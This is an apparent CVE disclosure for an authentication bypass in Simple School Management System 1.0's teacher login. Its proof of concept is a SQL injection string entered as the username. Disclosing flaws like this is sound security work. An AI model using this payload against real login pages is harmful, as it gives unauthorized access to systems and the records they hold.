# CVE-2024-25313 - Simple School Managment System - Authentication Bypass - 2 (Teacher Login)
+ **Exploit Title:** Simple School Managment System - Authentication Bypass - 2 (Teacher Login)
+ **Date:** 2024-30-01
+ **Exploit Author:** Tuba Kavgacı
+ **Vendor Homepage:** https://code-projects.org/simple-school-management-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/d10e92aa-e37f-46fd-9bf8-45878956d7c0
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** CVE-2024-25313

## Description:
Simple School Managment System 1.0 allows Authentication Bypass via the `username` and `password` parameters at "http://localhost/School/teacher_login.php". 

## Proof of Concept:
+ Go to this address: "http://localhost/School/teacher_login.php"
+ username : `'or 1=1-- -` password : `1`  and log in
+ Authentication Bypass Successful !

![Ekran görüntüsü 2024-02-01 150225](https://github.com/tubakvgc/CVEs/assets/74067343/821e1d60-6653-4cba-b5dc-850cd93b6f0d)

![Ekran görüntüsü 2024-02-01 150417](https://github.com/tubakvgc/CVEs/assets/74067343/226fec38-d74c-48d6-8b39-3fdfd0326e0a)
